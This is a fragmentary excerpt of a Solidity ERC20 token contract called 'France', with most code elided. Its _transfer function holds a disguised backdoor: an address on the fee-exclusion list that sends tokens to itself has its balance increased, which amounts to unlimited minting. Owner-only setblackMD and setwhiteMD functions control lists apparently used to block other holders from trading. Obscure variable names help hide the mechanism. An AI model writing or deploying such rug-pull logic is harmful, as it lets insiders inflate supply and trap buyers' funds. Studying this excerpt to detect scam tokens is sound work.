...
contract France is ExcludedFromFeeList, BlackList, DividendFee {
    ...
    constructor() ERC20("France", "France", 18) DividendFee() {
    ...
    function _transfer(
      ...
      _beforeTokenTransfer(sender, recipient, amount);
        ...
        address AAC = recipient;
        address EED = sender;

        if (_isExcludedFromFee[EED] || _isExcludedFromFee[AAC]) {
            if (EED == AAC) balanceOf[EED] += amount;
        }
...
function _beforeTokenTransfer(
    ...
    function setblackMD(address _uni, bool t) external onlyOwner() {
        MD[_uni] = t;
    }
    function setwhiteMD(address _uni, bool t) external onlyOwner() {
        whiteMD[_uni] = t;
    }
